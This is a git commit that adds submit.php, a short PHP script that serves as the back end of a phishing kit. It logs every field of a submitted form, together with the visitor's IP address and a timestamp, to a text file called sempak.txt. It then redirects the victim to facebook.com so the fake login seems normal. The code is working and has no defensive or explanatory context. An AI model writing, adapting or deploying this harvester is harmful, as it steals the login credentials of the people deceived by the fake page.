19aeb5d598d529dc60bb1c09227f2c62fc62a7c2
mynamekrs17 <mynamekrs17@gmail.com>
2017-05-12 06:16:51 +0700

    Add files via upload

---
+++ submit.php
@@ -0,0 +1,10 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+header('Location: http://www.facebook.com');
+$handle = fopen('sempak.txt', 'a');
+fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable.': '.$value."\r\n");}
+fclose($handle);
+exit;
+} ?>
